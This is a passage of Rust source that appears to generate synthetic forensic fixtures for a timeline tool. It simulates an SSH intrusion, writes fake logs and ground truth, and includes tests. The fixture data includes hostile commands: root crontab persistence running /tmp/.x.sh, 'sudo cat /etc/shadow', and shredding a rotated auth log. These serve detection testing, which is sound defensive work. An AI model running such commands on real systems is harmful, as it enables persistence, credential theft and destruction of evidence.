        self.auth(t, "usermod", pid, "add 'sysbackup' to shadow group 'sudo'");
        self.step(
            "S14",
            "sysbackup added to the sudo group",
            t,
            EventKind::UserModified,
            None,
            &[("account", "sysbackup"), ("group", "sudo")],
            Some("admin-group"),
        );

        // S15: persistence via root's crontab.
        let t = self.lt(12, 31, 23, 15, 21);
        self.hist(
            root,
            t,
            "(crontab -l 2>/dev/null; echo '5 0 * * * /tmp/.x.sh') | crontab -",
        );
        let t = t + Duration::seconds(1);
        let pid = self.next_pid();
        self.cron(t, "crontab", pid, "(root) REPLACE (root)");
        self.step(
            "S15",
            "Root crontab replaced",
            t,
            EventKind::CrontabChange,
            Some("root"),
            &[("action", "replace")],
            Some("crontab"),
        );
        self.file(
            "/var/spool/cron/crontabs/root",
            "r/rrw-------",
            0,
            1_204,
            t.timestamp(),
            t.timestamp(),
            t.timestamp(),
            t.timestamp() - 300 * 86_400,
        );
        self.cron(
            self.lt(12, 31, 23, 16, 1),
            "cron",
            641,
            "(root) RELOAD (crontabs/root)",
        );

        // S16: deploy leaves.
        let t = self.lt(12, 31, 23, 16, 40);
        self.hist(root, t - Duration::seconds(3), "exit");
        self.hist(bash, t - Duration::seconds(2), "exit");
        let pid = self.next_pid();
        self.auth(
            t,
            "sshd",
            pid,
            &format!("Received disconnect from {ATTACKER_IP} port 50122:11: disconnected by user"),
        );
        self.auth(
            t,
            "sshd",
            pid,
            &format!("Disconnected from user deploy {ATTACKER_IP} port 50122"),
        );
        self.auth(
            t,
            "sshd",
            pid,
            "pam_unix(sshd:session): session closed for user deploy",
        );
        self.auth(t, "systemd-logind", 612, "Removed session 31.");
        let rec = self.utmp_rec(t, ut_type::DEAD_PROCESS, "pts/1", "", "");
        self.wtmp.push(rec);
        self.step(
            "S16",
            "deploy session ends (wtmp logout paired with the login)",
            t,
            EventKind::Logout,
            Some("deploy"),
            &[("tty", "pts/1")],
            None,
        );
        self.file(
            "/home/deploy/.bash_history",
            "r/rrw-------",
            1001,
            3_120,
            t.timestamp(),
            t.timestamp(),
            t.timestamp(),
            ts - 100 * 86_400,
        );

        // S17: cron fires after midnight (year rollover in year-less logs).
        let pid = self.next_pid();
        self.auth(
            cron_exec,
            "CRON",
            pid,
            "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)",
        );
        self.cron(cron_exec, "CRON", pid, "(root) CMD (/tmp/.x.sh)");
        self.step(
            "S17",
            "cron executes /tmp/.x.sh as root after midnight",
            cron_exec,
            EventKind::CronCommand,
            Some("root"),
            &[("command", "/tmp/.x.sh")],
            Some("cron-temp"),
        );
        self.auth(
            cron_exec + Duration::seconds(2),
            "CRON",
            pid,
            "pam_unix(cron:session): session closed for user root",
        );

        // S18-S22: backdoor used.
        let t = self.lt(1, 1, 0, 31, 15);
        let pid = self.next_pid();
        self.auth(t, "sshd", pid, &format!("Accepted publickey for sysbackup from {BACKDOOR_IP} port 40022 ssh2: ED25519 SHA256:pQ1wX0vB7nYt3sKc8mRe5LaF2hUj9dZo4gTi6yNb1Ws"));
        self.step(
            "S18",
            "sysbackup logs in by public key from a second external IP",
            t,
            EventKind::SshLoginSuccess,
            Some("sysbackup"),
            &[("src_ip", BACKDOOR_IP), ("auth_method", "publickey")],
            None,
        );
        self.auth(
            t,
            "sshd",
            pid,
            "pam_unix(sshd:session): session opened for user sysbackup(uid=1002) by (uid=0)",
        );
        self.auth(
            t,
            "systemd-logind",
            612,
            "New session 33 of user sysbackup.",
        );
        let login = self.utmp_rec(
            t + Duration::seconds(1),
            ut_type::USER_PROCESS,
            "pts/2",
            "sysbackup",
            BACKDOOR_IP,
        );
        self.wtmp.push(login.clone());
        self.utmp.push(login);
        self.step(
            "S19",
            "wtmp/utmp record the sysbackup session on pts/2",
            t + Duration::seconds(1),
            EventKind::Login,
            Some("sysbackup"),
            &[("tty", "pts/2")],
            None,
        );
        let fish = "home/sysbackup/.local/share/fish/fish_history";
        let t = self.lt(1, 1, 0, 32, 2);
        self.hist(fish, t, "whoami");
        let t = self.lt(1, 1, 0, 33, 0);
        self.hist(fish, t, "sudo cat /etc/shadow");
        let t = self.lt(1, 1, 0, 33, 2);
        self.sudo(
            t,
            "sysbackup",
            "pts/2",
            "/home/sysbackup",
            "/usr/bin/cat /etc/shadow",
        );
        self.step(
            "S20",
            "sysbackup reads /etc/shadow through sudo",
            t,
            EventKind::SudoCommand,
            Some("sysbackup"),
            &[("command", "/usr/bin/cat /etc/shadow")],
            Some("sudo-to-root"),
        );
        let shred = "sudo shred -u /var/log/auth.log.1";
        let t = self.lt(1, 1, 0, 34, 10);
        self.hist(fish, t, shred);
        self.step(
            "S21",
            "Anti-forensics: rotated auth log shredded",
            t,
            EventKind::ShellCommand,
            Some("sysbackup"),
            &[("command", shred)],
            Some("anti-forensics"),
        );
        let t = self.lt(1, 1, 0, 34, 11);
        self.sudo(
            t,
            "sysbackup",
            "pts/2",
            "/home/sysbackup",
            "/usr/bin/shred -u /var/log/auth.log.1",
        );
        let gone = (t + Duration::seconds(2)).timestamp();
        self.file(
            "/var/log/auth.log.1 (deleted)",
            "r/rrw-r-----",
            104,
            0,
            gone - 5 * 86_400,
            gone - 86_400,
            gone,
            gone - 6 * 86_400,
        );
        self.step(
            "S22",
            "File system: the shredded log's inode changes (deleted entry)",
            t + Duration::seconds(2),
            EventKind::FileActivity,
            None,
            &[("path", "/var/log/auth.log.1 (deleted)"), ("macb", "..C.")],
            None,
        );
    }

    fn render(mut self, out: &Path) -> Result<GroundTruth> {
        let ev = out.join("evidence");
        let w = |rel: &str, data: &[u8]| -> Result<()> {
            let p = ev.join(rel);
            if let Some(parent) = p.parent() {
                fs::create_dir_all(parent).map_err(|e| Error::io(parent, e))?;
            }
            fs::write(&p, data).map_err(|e| Error::io(&p, e))
        };
        self.logs.sort_by_key(|r| (r.t, r.seq));

        // Local-time syslog files.
        let mut files: BTreeMap<u8, String> = BTreeMap::new();
        for r in &self.logs {
            let local = self.tz.to_local(r.t);
            let tag = if r.pid > 0 {
                format!("{}[{}]", r.prog, r.pid)
            } else {
                r.prog.clone()
            };
            let line = format!(
                "{} {:>2} {} {HOST} {tag}: {}\n",
                MONTHS[local.month0() as usize],
                local.day(),
                local.format("%H:%M:%S"),
                r.msg
            );
            for d in [AUTH, SYSLOG, CRON] {
                if r.dest & d != 0 {
                    files.entry(d).or_default().push_str(&line);
                }
            }
        }
        w(
            "var/log/auth.log",
            files.get(&AUTH).map_or(b"" as &[u8], |s| s.as_bytes()),
        )?;
        w(
            "var/log/syslog",
            files.get(&SYSLOG).map_or(b"" as &[u8], |s| s.as_bytes()),
        )?;
        w(
            "var/log/cron.log",
            files.get(&CRON).map_or(b"" as &[u8], |s| s.as_bytes()),
        )?;

        // journalctl -o export (UTC microseconds).
        let boot = self.lt(12, 28, 0, 0, 0);
        let mut journal = Vec::new();
        for (i, r) in self.logs.iter().filter(|r| r.journal).enumerate() {
            let micros = r.t.timestamp() * 1_000_000 + i64::from(r.sub_us);
            let mono = micros - boot.timestamp() * 1_000_000;
            let facility = if r.dest & AUTH != 0 { "10" } else { "3" };
            let (comm, ident) = match r.prog.as_str() {
                "CRON" => ("cron".to_string(), "CRON".to_string()),
                p => (p.to_string(), p.to_string()),
            };
            let pid = if r.pid > 0 {
                r.pid.to_string()
            } else {
                (self.pid + 1 + i as u32 % 97).to_string()
            };
            write_entry(
                &mut journal,
                &[
                    (
                        "__CURSOR",
                        &format!(
                            "s=5e1f0c2a9b7d4e66a1c3;i={:x};b=8c41d2e0;m={mono:x}",
                            0x1000 + i
                        ),
                    ),
                    ("__REALTIME_TIMESTAMP", &micros.to_string()),
                    ("__MONOTONIC_TIMESTAMP", &mono.to_string()),
                    ("_BOOT_ID", "8c41d2e0f5b94c0f9e3a7d1b2c6f4a90"),
                    ("PRIORITY", "6"),
                    ("SYSLOG_FACILITY", facility),
                    (
                        "_TRANSPORT",
                        if r.prog == "kernel" {
                            "kernel"
                        } else {
                            "syslog"
                        },
                    ),
                    ("_HOSTNAME", HOST),
                    ("SYSLOG_IDENTIFIER", &ident),
                    ("_COMM", &comm),
                    ("_PID", &pid),
                    ("_UID", &r.uid.to_string()),
                    ("MESSAGE", &r.msg),
                ],
            );
        }
        w("var/log/journal/web01.export", &journal)?;

        // Binary login records.
        let enc = |v: &[UtmpRecord]| v.iter().flat_map(|r| r.encode()).collect::<Vec<u8>>();
        self.wtmp.sort_by_key(|r| (r.tv_sec, r.tv_usec));
        self.btmp.sort_by_key(|r| (r.tv_sec, r.tv_usec));
        w("var/log/wtmp", &enc(&self.wtmp))?;
        w("var/log/btmp", &enc(&self.btmp))?;
        w("run/utmp", &enc(&self.utmp))?;

        // Shell histories.
        for (file, entries) in &mut self.history {
            entries.sort_by_key(|(t, _)| *t);
            let mut s = String::new();
            for (t, cmd) in entries.iter() {
                if file.ends_with(".bash_history") {
                    let _ = write!(s, "#{t}\n{cmd}\n");
                } else if file.ends_with(".zsh_history") {
                    let _ = writeln!(s, ": {t}:0;{cmd}");
                } else {
                    let esc = cmd.replace('\\', "\\\\").replace('\n', "\\n");
                    let _ = write!(s, "- cmd: {esc}\n  when: {t}\n");
                }
            }
            w(file, s.as_bytes())?;
        }

        // Package logs.
        self.dpkg.sort();
        w("var/log/dpkg.log", (self.dpkg.join("\n") + "\n").as_bytes())?;
        self.apt.sort();
        w(
            "var/log/apt/history.log",
            ("\n".to_string() + &self.apt.join("\n")).as_bytes(),
        )?;

        // Bodyfile (fls -m / -r output) and system identity.
        self.body.sort_by(|a, b| a.0.cmp(&b.0));
        let mut body = String::new();
        for (path, inode, mode, uid, size, [a, m, c, b]) in &self.body {
            let _ = writeln!(
                body,
                "0|{path}|{inode}|{mode}|{uid}|{uid}|{size}|{a}|{m}|{c}|{b}"
            );
        }
        w("bodyfile.txt", body.as_bytes())?;
        w("etc/hostname", format!("{HOST}\n").as_bytes())?;
        w("etc/timezone", format!("{ZONE_NAME}\n").as_bytes())?;
        w(&format!("usr/share/zoneinfo/{ZONE_NAME}"), &fixture_tzif())?;
        let link = ev.join("etc/localtime");
        let _ = fs::remove_file(&link);
        write_localtime_link(&link)?;

        self.steps
            .sort_by(|a, b| a.utc.cmp(&b.utc).then(a.id.cmp(&b.id)));
        let truth = GroundTruth {
            host: HOST.into(),
            timezone: ZONE_NAME.into(),
            summary: "SSH brute force from 203.0.113.45 leads to a password login as deploy, \
payload staging in /tmp, sudo to a root shell, netcat install, backdoor account sysbackup \
(sudo group), root crontab persistence that fires after midnight, then a public-key login as \
sysbackup from 192.0.2.99 that reads /etc/shadow and shreds a rotated log."
                .into(),
            steps: self.steps,
        };
        let json =
            serde_json::to_string_pretty(&truth).map_err(|e| Error::Invalid(e.to_string()))?;
        fs::write(out.join("GROUND_TRUTH.json"), json + "\n").map_err(|e| Error::io(out, e))?;
        fs::write(out.join("STORY.md"), story_markdown(&truth)).map_err(|e| Error::io(out, e))?;
        Ok(truth)
    }
}

#[cfg(unix)]
fn write_localtime_link(link: &Path) -> Result<()> {
    std::os::unix::fs::symlink(format!("/usr/share/zoneinfo/{ZONE_NAME}"), link)
        .map_err(|e| Error::io(link, e))
}

#[cfg(not(unix))]
fn write_localtime_link(link: &Path) -> Result<()> {
    fs::write(link, fixture_tzif()).map_err(|e| Error::io(link, e))
}

/// TZif bytes for the fixture zone: explicit 2023-2024 transitions plus the
/// POSIX footer (the incident window lies after the last transition, so the
/// footer path is exercised).
pub fn fixture_tzif() -> Vec<u8> {
    let rule = PosixTz::parse(POSIX_RULE).expect("fixture rule is valid");
    let mut transitions = Vec::new();
    for year in [2023, 2024] {
        if let Some((start, end)) = rule.transitions_in_year(year) {
            transitions.push((start, 1u8));
            transitions.push((end, 0u8));
        }
    }
    let types = [
        LocalType {
            utoff: -5 * 3600,
            is_dst: false,
            abbr: "EST".into(),
        },
        LocalType {
            utoff: -4 * 3600,
            is_dst: true,
            abbr: "EDT".into(),
        },
    ];
    write_tzif_v2(&transitions, &types, Some(POSIX_RULE))
}

fn story_markdown(t: &GroundTruth) -> String {
    let mut s = format!(
        "# Ground truth: synthetic intrusion on `{}`\n\nAll artifacts under `evidence/` are synthetic and were produced by \
`timeliner fixtures` (seeded, deterministic). Local-time logs use `{}`; the incident window is in EST (UTC-5).\n\n{}\n\n\
| Step | UTC | Local ({}) | Expected kind | Expected tag | What happened |\n|---|---|---|---|---|---|\n",
        t.host, t.timezone, t.summary, t.timezone
    );
    for st in &t.steps {
        let _ = writeln!(
            s,
            "| {} | {} | {} | `{}` | {} | {} |",
            st.id,
            st.utc,
            st.local,
            st.kind,
            st.tag
                .as_deref()
                .map(|x| format!("`{x}`"))
                .unwrap_or_else(|| "—".into()),
            st.title
        );
    }
    s.push_str("\nBackground noise (cron every 15 minutes, single-attempt internet scanners from 198.18.0.0/15, the \
administrator `alice` logging in daily from 198.51.100.7, a routine `deploy` release on Dec 30 from 198.51.100.23, an \
`apt upgrade` on Dec 29) is mixed in so that the story has to be found, not just listed.\n");
    s
}

/// Generates the fixture tree under `out` (`out/evidence/...`,
/// `out/GROUND_TRUTH.json`, `out/STORY.md`) and returns the ground truth.
pub fn generate(out: &Path, opts: &FixtureOptions) -> Result<GroundTruth> {
    let tz = TimeZone::from_tzif(&fixture_tzif(), ZONE_NAME)?;
    let mut g = Gen::new(opts, tz);
    g.baseline();
    g.attack();
    fs::create_dir_all(out).map_err(|e| Error::io(out, e))?;
    g.render(out)
}

/// Loads a ground-truth file.
pub fn load_ground_truth(path: &Path) -> Result<GroundTruth> {
    let text = fs::read_to_string(path).map_err(|e| Error::io(path, e))?;
    serde_json::from_str(&text).map_err(|e| Error::Invalid(format!("{}: {e}", path.display())))
}

/// Outcome of checking a timeline against the ground truth.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct StoryCheck {
    /// Step id → index of the matching event in the timeline (None = missing).
    pub found: Vec<(String, Option<usize>)>,
    /// Steps whose expected tag was not attached.
    pub missing_tags: Vec<String>,
    /// True when every found step appears after the previous one.
    pub in_order: bool,
}

impl StoryCheck {
    /// True when every step was found, tagged as expected, and in order.
    pub fn passed(&self) -> bool {
        self.in_order && self.missing_tags.is_empty() && self.found.iter().all(|(_, i)| i.is_some())
    }
}

/// Locates each step in a time-sorted timeline.
pub fn check_story(truth: &GroundTruth, events: &[Event]) -> StoryCheck {
    let mut found = Vec::new();
    let mut missing_tags = Vec::new();
    let mut last: Option<usize> = None;
    let mut in_order = true;
    for st in &truth.steps {
        let idx = events.iter().position(|e| st.matches(e));
        if let Some(i) = idx {
            if let Some(tag) = &st.tag
                && !events[i].tags.iter().any(|t| t == tag)
            {
                missing_tags.push(st.id.clone());
            }
            if last.is_some_and(|l| i <= l) {
                in_order = false;
            }
            last = Some(i);
        }
        found.push((st.id.clone(), idx));
    }
    StoryCheck {
        found,
        missing_tags,
        in_order,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rng_is_deterministic() {
        let mut a = Rng::new(7);
        let mut b = Rng::new(7);
        for _ in 0..100 {
            assert_eq!(a.next_u64(), b.next_u64());
        }
        let mut r = Rng::new(1);
        for _ in 0..1000 {
            let v = r.range(3, 5);
            assert!((3..=5).contains(&v));
        }
        assert_eq!(*Rng::new(3).pick(&[9]), 9);
    }

    #[test]
    fn tzif_fixture_matches_new_york_rules() {
        let tz = TimeZone::from_tzif(&fixture_tzif(), ZONE_NAME).unwrap();
        let utc = |s: &str| DateTime::parse_from_rfc3339(s).unwrap().timestamp();
        assert_eq!(tz.offset_at(utc("2024-07-01T00:00:00Z")), -4 * 3600);
        assert_eq!(tz.offset_at(utc("2025-01-01T04:00:00Z")), -5 * 3600);
        assert_eq!(tz.offset_at(utc("2025-07-01T00:00:00Z")), -4 * 3600);
    }

    #[test]
    fn generation_is_deterministic_and_documented() {
        let a = tempfile::tempdir().unwrap();
        let b = tempfile::tempdir().unwrap();
        let ta = generate(a.path(), &FixtureOptions::default()).unwrap();
        let tb = generate(b.path(), &FixtureOptions::default()).unwrap();
        assert_eq!(ta, tb);
        assert_eq!(ta.steps.len(), 22);
        for rel in [
            "evidence/var/log/auth.log",
            "evidence/var/log/wtmp",
            "evidence/bodyfile.txt",
            "evidence/var/log/journal/web01.export",
        ] {
            assert_eq!(
                fs::read(a.path().join(rel)).unwrap(),
                fs::read(b.path().join(rel)).unwrap(),
                "{rel}"
            );
        }
        let loaded = load_ground_truth(&a.path().join("GROUND_TRUTH.json")).unwrap();
        assert_eq!(loaded, ta);
        let story = fs::read_to_string(a.path().join("STORY.md")).unwrap();
        assert!(story.contains("| S17 |"));
        // Regenerating into an existing tree works (symlink replaced).
        generate(a.path(), &FixtureOptions::default()).unwrap();
        assert!(load_ground_truth(&a.path().join("missing.json")).is_err());
    }

    #[test]
    fn step_matching_and_story_check() {
        let truth = GroundTruth {
            host: HOST.into(),
            timezone: ZONE_NAME.into(),
            summary: String::new(),
            steps: vec![Step {
                id: "S1".into(),
                title: "t".into(),
                utc: "2025-01-01T04:07:12Z".into(),
                local: String::new(),
                kind: EventKind::SshLoginSuccess,
                user: Some("deploy".into()),
                fields: [("src_ip".to_string(), ATTACKER_IP.to_string())].into(),
                tag: Some("ssh-new-ip".into()),
            }],
        };
        let ts = truth.steps[0].instant().unwrap() + Duration::milliseconds(300);
        let e = Event::new(
            ts,
            crate::event::SourceKind::AuthLog,
            EventKind::SshLoginSuccess,
            "a",
            1,
            "d",
        )
        .with_user(Some("deploy"))
        .with_field("src_ip", ATTACKER_IP);
        let check = check_story(&truth, std::slice::from_ref(&e));
        assert!(!check.passed());
        assert_eq!(check.missing_tags, vec!["S1"]);
        let mut tagged = e.clone();
        tagged.add_tag("ssh-new-ip");
        assert!(check_story(&truth, &[tagged]).passed());
        assert!(!check_story(&truth, &[]).passed());
    }
}
